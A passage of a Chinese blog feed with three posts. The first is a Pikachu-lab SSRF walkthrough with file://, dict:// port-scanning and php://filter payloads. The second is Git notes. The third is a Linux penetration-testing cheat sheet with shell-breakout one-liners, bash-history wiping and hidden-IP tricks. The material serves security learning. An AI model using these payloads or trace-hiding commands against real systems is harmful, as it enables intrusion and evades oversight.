class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求, <strong>则请做好目标地址的过滤</strong>。</p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/211a50ac2a40368ccccf0729f3a7ce16.png"></p><p><strong>SSRF 漏洞常用协议：</strong></p><p>1）HTTP(s): 最常用到的一种协议，可以用来验证是否存在 SSRF 漏洞，探测端口以及服务。<br>2）file：本地文件传输协议，可以用来读取任意系统文件<br>3）dict: 字典服务器协议，dict 是基于查询相应的 TCP 协议，服务器监听端口 2628。在 SSRF 漏洞中可用于探测端口以及攻击内网应用<br>4）ghoper: 互联网上使用的分布型的文件搜集获取网络协议，出现在 http 协议之前。可用于攻击内网应用，可用于反弹 shell。</p><p><strong>代码分析：</strong></p><p>前端传进来的 url 被后台使用 curl_exec() 进行了请求, 然后将请求的结果又返回给了前端。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/aec69f582aa011f5546245559876e2b0.png"></p><p>点击链接后发现页面请求了 info1.php 文件，但是没有找到</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9b9bd5e34b1ae823978fff0f9aac3a88.png"></p><p>此处我们可以直接<code>file</code>协议去获取 hosts、win.ini 文件 (Windows 系统的一个基本系统配置文件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/Windows/System32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/15611fda2d363e1d08031e4c2a1dcc53.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/85fb99533ddbfab1d514b01d50a0e9c0.png"></p><p>或者使用<code>dict</code>协议扫描内网主机开放的端口，这里探测的主机是<code>192.168.0.106</code>，在目标主机上开启 http 服务</p><p><img src="https://img-blog.csdnimg.cn/img_convert/aa29cbd09cf1ea1f18b386a5b9af35da.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://192.168.0.106:8000</span><br></pre></td></tr></table></figure><p>端口不存在的时候页面显示正常</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7357b00ad734f51faa2e396a9d24abb7.png"></p><p>端口存在时页面会显示错误信息 (根据差异信息判断端口是否开放)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/eee3cd5a595c37129012ea2b4d9cc5f0.png"></p><p>使用 burp 进行批量端口扫描，因为时间关系这里就只演示 8000-8100 的端口范围</p><p><img src="https://img-blog.csdnimg.cn/img_convert/44165164ba724704fdc28c108923df50.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/07db36cc66daab72af54df52bacb7dd9.png"></p><p>根据返回包长度可以判断出端口是否存活</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7f3fd971fe2669620a985588b6375eab.png"></p><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/04a5497f0ffb0f503c27bec479efefd1.png"></p><p><strong>代码分析：</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a445eb1571da42a0110bb63638322093.png"></p><p>本关使用了 file_get_contents() 函数，该函数将指定 URL 的文件读入一个字符串并返回。</p><p><strong>file_get_contents 与 curl 的区别：</strong></p><ul><li><p>curl 支持更多协议，有 http、https、ftp、gopher、telnet、dict、file、ldap；模拟 Cookie 登录，爬取网页；FTP 上传下载。</p></li><li><p>fopen &#x2F; file_get_contents 只能使用 GET 方式获取数据。</p></li></ul><p>点击链接后网页会请求一个 url</p><p><img src="https://img-blog.csdnimg.cn/img_convert/704f14e8a43b3534917264416cd71b7b.png"></p><p>直接使用<code>file</code>协议读取系统配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///c:/windows/win.ini</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/723fb39972a8a5de9cf7fc1c4d95141c.png"></p><p>或者使用<code>php://filter/</code>读 php 源代码，这里读取之前 unsafe fileupload 上传的一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=../unsafeupload/uploads/a.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c67f875f1287bcd1700cc5136ad4f2f9.png"></p><p>使用 base64 解码后得到 php 文件的源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3dd70f7d67a00d1206c5c2a41bd9e14b.png"></p><p>再或者可以使用<code>http</code>协议去请求内网资源，这里可以在本机创建一个 ssrf.txt 文件，并且使用 python 启动 http 服务</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2d44ee714e5c3776aa13f40ff36d4756.png"></p><p>利用 SSRF 漏洞去请求这个文件，即可获得文件中的内容</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fdfc270b5236e95171d4b5c832ab2803.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> Pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 文档</title>
      <link href="/2023/04/20/Git/Git%20%E6%96%87%E6%A1%A3/"/>
      <url>/2023/04/20/Git/Git%20%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="配置-Git"><a href="#配置-Git" class="headerlink" title="配置 Git"></a>配置 Git</h2><h3 id="设置用户名和邮箱"><a href="#设置用户名和邮箱" class="headerlink" title="设置用户名和邮箱"></a>设置用户名和邮箱</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;mlemontx&quot;</span><br><span class="line">git config --global user.email &quot;mlemontx@example.com&quot;</span><br></pre></td></tr></table></figure><h3 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息"></a>查看配置信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config -l</span><br><span class="line">git config --list</span><br></pre></td></tr></table></figure><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy  &#x27;http://127.0.0.1:7890&#x27; </span><br><span class="line">git config --global https.proxy &#x27;http://127.0.0.1:7890&#x27;</span><br></pre></td></tr></table></figure><h3 id="取消代理"><a href="#取消代理" class="headerlink" title="取消代理"></a>取消代理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h3 id="查看代理"><a href="#查看代理" class="headerlink" title="查看代理"></a>查看代理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --get http.proxy</span><br><span class="line">git config --global --get https.proxy</span><br></pre></td></tr></table></figure><h3 id="移除凭证"><a href="#移除凭证" class="headerlink" title="移除凭证"></a>移除凭证</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset credential.helper</span><br></pre></td></tr></table></figure><p>出现以下错误可以尝试使用该命令（拉取代码时输入用户名和 token）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote: repositorysitory not found.</span><br></pre></td></tr></table></figure><h2 id="获取远程仓库"><a href="#获取远程仓库" class="headerlink" title="获取远程仓库"></a>获取远程仓库</h2><h3 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/username/repository.git</span><br></pre></td></tr></table></figure><h2 id="管理远程仓库"><a href="#管理远程仓库" class="headerlink" title="管理远程仓库"></a>管理远程仓库</h2><h3 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h3><p><code>git remote add</code> 命令采用两个参数：</p><ul><li>远程名称（例如 <code>origin</code>）</li><li>远程 URL（例如 <code>https://github.com/username/repository.git</code>）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://github.com/username/repository.git</span><br></pre></td></tr></table></figure><h3 id="查看当前的远程库"><a href="#查看当前的远程库" class="headerlink" title="查看当前的远程库"></a>查看当前的远程库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><h3 id="更改远程仓库的-URL"><a href="#更改远程仓库的-URL" class="headerlink" title="更改远程仓库的 URL"></a>更改远程仓库的 URL</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin https://github.com/username/new_repository.git</span><br></pre></td></tr></table></figure><h3 id="重命名远程仓库"><a href="#重命名远程仓库" class="headerlink" title="重命名远程仓库"></a>重命名远程仓库</h3><p><code>git remote rename</code> 命令采用两个参数：</p><ul><li>现有远程名称（例如 <code>origin</code>）</li><li>远程的新名称（例如 <code>destination</code>）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote rename origin destination</span><br></pre></td></tr></table></figure><h3 id="删除远程仓库"><a href="#删除远程仓库" class="headerlink" title="删除远程仓库"></a>删除远程仓库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote remove origin</span><br><span class="line">git remove rm origin</span><br></pre></td></tr></table></figure><h2 id="管理分支"><a href="#管理分支" class="headerlink" title="管理分支"></a>管理分支</h2><h3 id="签出分支"><a href="#签出分支" class="headerlink" title="签出分支"></a>签出分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout branchName</span><br></pre></td></tr></table></figure><h3 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h3><h4 id="查看本地已经存在的分支（当前分支会用-标记）"><a href="#查看本地已经存在的分支（当前分支会用-标记）" class="headerlink" title="查看本地已经存在的分支（当前分支会用*标记）"></a>查看本地已经存在的分支（当前分支会用<code>*</code>标记）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure><h4 id="查看本地和远程的所有分支（remotes-开头表示远程分支）："><a href="#查看本地和远程的所有分支（remotes-开头表示远程分支）：" class="headerlink" title="查看本地和远程的所有分支（remotes/ 开头表示远程分支）："></a>查看本地和远程的所有分支（<code>remotes/</code> 开头表示远程分支）：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure><h3 id="本地分支关联远程分支"><a href="#本地分支关联远程分支" class="headerlink" title="本地分支关联远程分支"></a>本地分支关联远程分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --set-upstream-to=origin/remote_branch your_branch</span><br></pre></td></tr></table></figure><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><h3 id="删除本地缓存"><a href="#删除本地缓存" class="headerlink" title="删除本地缓存"></a>删除本地缓存</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached .</span><br></pre></td></tr></table></figure><h3 id="重新添加"><a href="#重新添加" class="headerlink" title="重新添加"></a>重新添加</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><h1 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><h2 id="撤回"><a href="#撤回" class="headerlink" title="撤回"></a>撤回</h2><h3 id="已提交撤回"><a href="#已提交撤回" class="headerlink" title="已提交撤回"></a>已提交撤回</h3><ol><li>查看历史提交日志 <code>git log</code></li><li>通过 <code>git reset HEAD^^</code> 回退两个版本</li></ol><h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.</span><br></pre></td></tr></table></figure><p>原先的密码凭证从2021年8月13日开始就不能用了，必须使用个人访问令牌（personal access token），就是把密码替换成 token！</p><p>每次管理远程分支都要输入用户名和 token，怎么办？<br>更改远程仓库的 URL 为 <code>https://&lt;token&gt;@github.com/username/repository.git</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin https://&lt;token&gt;@github.com/username/repository.git</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 渗透测试常用命令</title>
      <link href="/2023/03/01/Linux/Linux%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/03/01/Linux/Linux%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>如下是一份 Linux 机器的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>备忘录，是在后期开发期间或者执行命令注入等操作时的一些典型命令，设计为测试人员进行本地枚举检查之用。</p><p>此外，你还可以从<a href="https://gbhackers.com/category/pentesting/">这儿</a>阅读到许多关于渗透测试的文章。</p><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>netstat -tulpn</td><td>在 Linux 中显示对应了进程 ID（PID）的网络端口。</td></tr><tr><td>watch ss -stplu</td><td>通过套接字实时观察 TCP, UDP 端口。</td></tr><tr><td>lsof -i</td><td>显示确认了的连接。</td></tr><tr><td>macchanger -m MACADDR INTR</td><td>在 KALI Linux 上修改 MAC 地址。</td></tr><tr><td>ifconfig eth0 192.168.2.1/24</td><td>在 Linux 中设置 ID 地址。</td></tr><tr><td>ifconfig eth0:1 192.168.2.3/24</td><td>在 Linux 中向现有的网络接口添加 IP 地址。</td></tr><tr><td>ifconfig eth0 hw ether MACADDR</td><td>使用 ifconfig 修改 Linux 中的 MAC 地址。</td></tr><tr><td>ifconfig eth0 mtu 1500</td><td>在 Linux 中使用 ifconfig 修改 MTU 的大小，将 1500 改为你想要的 MTU。</td></tr><tr><td>dig -x 192.168.1.1</td><td>对 IP 地址进行反向查找。</td></tr><tr><td>host 192.168.1.1</td><td>在一个 IP 地址上进行反向查找，适用于没有安装 dig 的情况。</td></tr><tr><td>dig @192.168.2.2 domain.com -t AXFR</td><td>使用 dig 执行一次 DNS 区域传输。</td></tr><tr><td>host -l domain.com nameserver</td><td>使用 host 执行一次 DNS 区域传输。</td></tr><tr><td>nbtstat -A x.x.x.x</td><td>获取 IP 地址对应的域名。</td></tr><tr><td>ip addr add 192.168.2.22/24 dev eth0</td><td>向 Linux 添加一个隐藏的 IP 地址，在执行 ifconfig 命令时不会显示这个 IP 地址。</td></tr><tr><td>tcpkill -9 host google.com</td><td>阻止从主机访问 google.com。</td></tr><tr><td>echo “1” &gt; /proc/sys/net/ipv4/ip_forward</td><td>启用 IP 转发，将 Linux 盒子变成一个路由器——这样就方便通过这个盒子来进行路由流量的控制。</td></tr><tr><td>echo “8.8.8.8” &gt; /etc/resolv.conf</td><td>使用 Google 的 DNS。</td></tr></tbody></table>  <h3 id="系统信息命令"><a href="#系统信息命令" class="headerlink" title="系统信息命令"></a>系统信息命令</h3><p>对于本地的枚举检查很有用。</p><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>whoami</td><td>显示 Linux 上当前已登录用户。</td></tr><tr><td>id</td><td>向用户显示当前已登录的用户和组。</td></tr><tr><td>last</td><td>显示最后一次登陆的用户。</td></tr><tr><td>mount</td><td>显示已挂载的驱动。</td></tr><tr><td>df -h</td><td>用人类可读的输出显示磁盘使用情况。</td></tr><tr><td>echo “user:passwd” | chpasswd</td><td>用一行命令重置密码。</td></tr><tr><td>getent passwd</td><td>列出 Linux 上的用户。</td></tr><tr><td>strings /usr/local/bin/blah</td><td>显示非文本文件的内容，例如：一个二进制文件里面有什么。</td></tr><tr><td>uname -ar</td><td>显示运行中的内核版本。</td></tr><tr><td>PATH=$PATH:/my/new-path</td><td>添加一个新的路径，方便进行本地文件系统（FS）操作。</td></tr><tr><td>history</td><td>显示用户在之前执行的 bash 脚本历史记录，还有敲入的命令。</td></tr></tbody></table>  <h4 id="基于-Redhat-x2F-CentOS-x2F-RPM-的发行版"><a href="#基于-Redhat-x2F-CentOS-x2F-RPM-的发行版" class="headerlink" title="基于 Redhat &#x2F; CentOS &#x2F; RPM 的发行版"></a>基于 Redhat &#x2F; CentOS &#x2F; RPM 的发行版</h4><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>cat /etc/redhat-release</td><td>显示 Redhat / CentOS 版本号。</td></tr><tr><td>rpm -qa</td><td>在基于 RPM 的 Linux 上列出所有已经安装上的 RPM 包。</td></tr><tr><td>rpm -q –changelog openvpn</td><td>检查已安装的 RPM 是否针对 CVE 打了补丁，可以用 grep 命令过滤出跟 CVE 有关的输出。</td></tr></tbody></table>  <h4 id="YUM-命令"><a href="#YUM-命令" class="headerlink" title="YUM 命令"></a>YUM 命令</h4><p>基于 RPM 的系统使用了包管理器, 你可以用这些命令获取到有关已安装包或者其它工具的有用信息。</p><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>yum update</td><td>使用 YUM 更新所有的 RPM 包，也会显示出哪些已经过时了。</td></tr><tr><td>yum update httpd</td><td>更新单独的包，在此例中是 HTTPD (Apache)。</td></tr><tr><td>yum install package</td><td>使用 YUM 安装一个包。</td></tr><tr><td>yum –exclude=package kernel* update</td><td>在使用 YUM 时将一个包排除在外不更新。</td></tr><tr><td>yum remove package</td><td>使用 YUM 删除包。</td></tr><tr><td>yum erase package</td><td>使用 YUM 删除包。</td></tr><tr><td>yum list package</td><td>列出有关 yum 包的信息。</td></tr><tr><td>yum provides httpd</td><td>显示一个包是的用途，例如： Apache HTTPD Server。</td></tr><tr><td>yum info httpd</td><td>显示包信息，架构，版本等信息。</td></tr><tr><td>yum localinstall blah.rpm</td><td>使用 YUM 来安装本地 RPM， 从资源库进行安装。</td></tr><tr><td>yum deplist package</td><td>显示包的提供方信息。</td></tr><tr><td>yum list installed | more</td><td>列出所有已安装的包。</td></tr><tr><td>yum grouplist | more</td><td>显示所有的 YUM 分组。</td></tr><tr><td>yum groupinstall ‘Development Tools’</td><td>安装 YUM 分组。</td></tr></tbody></table>  <h4 id="基于-Debian-x2F-Ubuntu-x2F-deb-的发行版"><a href="#基于-Debian-x2F-Ubuntu-x2F-deb-的发行版" class="headerlink" title="基于 Debian &#x2F; Ubuntu &#x2F; .deb 的发行版"></a>基于 Debian &#x2F; Ubuntu &#x2F; .deb 的发行版</h4><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>cat /etc/debian_version</td><td>显示 Debian 版本号。</td></tr><tr><td>cat /etc/*-release</td><td>显示 Ubuntu 版本号。</td></tr><tr><td>dpkg -l</td><td>在基于 Debian / .deb 的 Linux 发行版上列出所有已安装的包。</td></tr></tbody></table><h3 id="Linux-用户管理"><a href="#Linux-用户管理" class="headerlink" title="Linux 用户管理"></a>Linux 用户管理</h3><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>useradd new-user</td><td>创建一个新的 Linux 用户。</td></tr><tr><td>passwd username</td><td>重置 Linux 用户密码, 如果你是 root 用户，只要输入密码就行了。</td></tr><tr><td>deluser username</td><td>删除一个 Linux 用户。</td></tr></tbody></table>  <h3 id="Linux-解压缩命令"><a href="#Linux-解压缩命令" class="headerlink" title="Linux 解压缩命令"></a>Linux 解压缩命令</h3><p>如何在 Linux 上解析不同的压缩包 (tar, zip, gzip, bzip2 等等) ，以及其它的一些用来在压缩包中进行搜索等操作的小技巧。</p><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>unzip archive.zip</td><td>在 Linux 上提取 zip 包中的文件。</td></tr><tr><td>zipgrep *.txt archive.zip</td><td>在一个 zip 压缩包中搜索。</td></tr><tr><td>tar xf archive.tar</td><td>在 Linux 上提取 tar 包中的文件。</td></tr><tr><td>tar xvzf archive.tar.gz</td><td>在 Linux 上提取 tar.gz 包中的文件。</td></tr><tr><td>tar xjf archive.tar.bz2</td><td>在 Linux 上提取 tar.bz2 包中的文件。</td></tr><tr><td>tar ztvf file.tar.gz | grep blah</td><td>在一个 tar.gz 文件中搜索。</td></tr><tr><td>gzip -d archive.gz</td><td>在 Linux 上提取 gzip 中的文件。</td></tr><tr><td>zcat archive.gz</td><td>在 Linux 以不解压缩的方式读取一个 gz 文件。</td></tr><tr><td>zless archive.gz</td><td>用较少的命令实现对 .gz 压缩包相同的功能。</td></tr><tr><td>zgrep ‘blah’ /var/log/maillog*.gz</td><td>在 Linux 上对 .gz 压缩包里面的内容执行搜索，比如搜索被压缩过的日志文件。</td></tr><tr><td>vim file.txt.gz</td><td>使用 vim 读取 .txt.gz 文件（我个人的最爱）。</td></tr><tr><td>upx -9 -o output.exe input.exe</td><td>在 Linux 上使用 UPX 压缩 .exe 文件。</td></tr></tbody></table>  <h3 id="Linux-压缩命令"><a href="#Linux-压缩命令" class="headerlink" title="Linux 压缩命令"></a>Linux 压缩命令</h3><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>zip -r file.zip /dir/*</td><td>在 Linux 上创建一个 .zip 文件。</td></tr><tr><td>tar cf archive.tar files</td><td>在 Linux 上创建一个 tar 文件。</td></tr><tr><td>tar czf archive.tar.gz files</td><td>在 Linux 上创建一个 tar.gz 文件。</td></tr><tr><td>tar cjf archive.tar.bz2 files</td><td>在 Linux 上创建一个 tar.bz2 文件。</td></tr><tr><td>gzip file</td><td>在 Linux 上创建一个 .gz 文件。</td></tr></tbody></table><h3 id="Linux-文件命令"><a href="#Linux-文件命令" class="headerlink" title="Linux 文件命令"></a>Linux 文件命令</h3><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>df -h blah</td><td>在 Linux 上显示文件 / 目录的大小。</td></tr><tr><td>diff file1 file2</td><td>在 Linux 上比对 / 显示两个文件之间的差别。</td></tr><tr><td>md5sum file</td><td>在 Linux 上生成 MD5 摘要。</td></tr><tr><td>md5sum -c blah.iso.md5</td><td>在 Linux 上检查文件的 MD5 摘要，这里假设文件和 .md5 处在相同的路径下。</td></tr><tr><td>file blah</td><td>在 Linux 上查找出文件的类型，也会将文件是 32 还是 64 位显示出来。</td></tr><tr><td>dos2unix</td><td>将 Windows 的行结束符转成 Unix/Linux 的。</td></tr><tr><td>base64 &lt;input-file&gt; output-file</td><td>对输入文件进行 Base64 编码，然后输出一个叫做 output-file 的 Base64 编码文件。</td></tr><tr><td>base64 -d &lt;input-file&gt; output-file</td><td>对输入文件进行 Base64 解码，然后输出一个叫做&nbsp;output-file 的 Base64 解码文件。</td></tr><tr><td>touch -r ref-file new-file</td><td>使用来自于引用文件的时间戳数据创建一个新文件，放上 -r 以简单地创建一个文件。</td></tr><tr><td>rm -rf</td><td>不显示确认提示就删除文件和目录。</td></tr></tbody></table><h3 id="Samba-命令"><a href="#Samba-命令" class="headerlink" title="Samba 命令"></a>Samba 命令</h3><p>从 Linux 连接到 Samba 共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ smbmount //server/share /mnt/win -o user=username,password=password1</span><br><span class="line">$ smbclient -U user \\\\server\\share</span><br><span class="line">$ mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share</span><br></pre></td></tr></table></figure><h3 id="打破-shell-的限制"><a href="#打破-shell-的限制" class="headerlink" title="打破 shell 的限制"></a>打破 shell 的限制</h3><p>要谢谢 G0tmi1k(（或者他参考过的内容）。</p><p>Python 小技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><h3 id="Misc-命令"><a href="#Misc-命令" class="headerlink" title="Misc 命令"></a>Misc 命令</h3><table><tbody><tr><th>命令</th><th>描述</th></tr></tbody><tbody><tr><td>init 6</td><td>从命令行重启 Linux 。</td></tr><tr><td>gcc -o output.c input.c</td><td>编译 C 代码。</td></tr><tr><td>gcc -m32 -o output.c input.c</td><td>交叉编译 C 代码，在 64 位 Linux 上将编译出&nbsp;32 位的二进制文件。</td></tr><tr><td>unset HISTORYFILE</td><td>关闭 bash 历史日志记录功能。</td></tr><tr><td>rdesktop X.X.X.X</td><td>从 Linux 连接到 RDP 服务器。</td></tr><tr><td>kill -9 $$</td><td>关掉当前的会话。</td></tr><tr><td>chown user:group blah</td><td>修改文件或者目录的所有者。</td></tr><tr><td>chown -R user:group blah</td><td>修改文件或者目录，以及目录下面文件 / 目录的拥有者 —— 递归执行 chown。</td></tr><tr><td>chmod 600 file</td><td>修改文件 / 目录的权限设定, 详情见 [Linux 文件系统权限](#linux-file-system-permissions) 。</td></tr></tbody></table><p>清除 bash 历史：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh user@X.X.X.X | cat /dev/null &gt; ~/.bash_history</span><br></pre></td></tr></table></figure><h3 id="Linux-文件系统权限"><a href="#Linux-文件系统权限" class="headerlink" title="Linux 文件系统权限"></a>Linux 文件系统权限</h3><table><tbody><tr><th>取值</th><th>意义</th></tr></tbody><tbody><tr><td>777</td><td>rwxrwxrwx 没有限制，完全可读可写可执行（RWX），用户可以做任何事情。</td></tr><tr><td>755</td><td>rwxr-xr-x 拥有者可完全访问，其他人只能读取和执行文件。</td></tr><tr><td>700</td><td>rwx——&nbsp;拥有者可完全访问，其他人都不能访问。</td></tr><tr><td>666</td><td>rw-rw-rw- 所有人可以读取和写入，但不可执行。</td></tr><tr><td>644</td><td>rw-r–r– 拥有者可以读取和写入，其他人只可以读取。</td></tr><tr><td>600</td><td>rw——-&nbsp;拥有者可以读取和写入，其他人都不能访问。</td></tr></tbody></table><h3 id="Linux-文件系统的渗透测试备忘录"><a href="#Linux-文件系统的渗透测试备忘录" class="headerlink" title="Linux 文件系统的渗透测试备忘录"></a>Linux 文件系统的渗透测试备忘录</h3><table><tbody><tr><th>目录</th><th>描述</th></tr></tbody><tbody><tr><td>/</td><td>/ 也被称为 “斜杠” 或者根。</td></tr><tr><td>/bin</td><td>由系统、系统管理员以及用户共享的通用程序。</td></tr><tr><td>/boot</td><td>Boot 文件, 启动加载器 (grub), 内核, vmlinuz</td></tr><tr><td>/dev</td><td>包含了对系统设备、带有特殊属性的文件的引用。</td></tr><tr><td>/etc</td><td>重要的系统配置文件。</td></tr><tr><td>/home</td><td>系统用户的主目录。</td></tr><tr><td>/lib</td><td>库文件，包括系统和用户都需要的所有类型的程序的文件。</td></tr><tr><td>/lost+found</td><td>文件操作失败会被保存在这里。</td></tr><tr><td>/mnt</td><td>外部文件系统的标准挂载点。</td></tr><tr><td>/media</td><td>外部文件系统（或者某些发行版）的挂载点。</td></tr><tr><td>/net</td><td>整个远程文件系统的标准挂载点 ——&nbsp;nfs。</td></tr><tr><td>/opt</td><td>一般都是包含一些附加的或者第三方软件。</td></tr><tr><td>/proc</td><td>一个包含了系统资源相关信息的虚拟文件系统。</td></tr><tr><td>/root</td><td>root 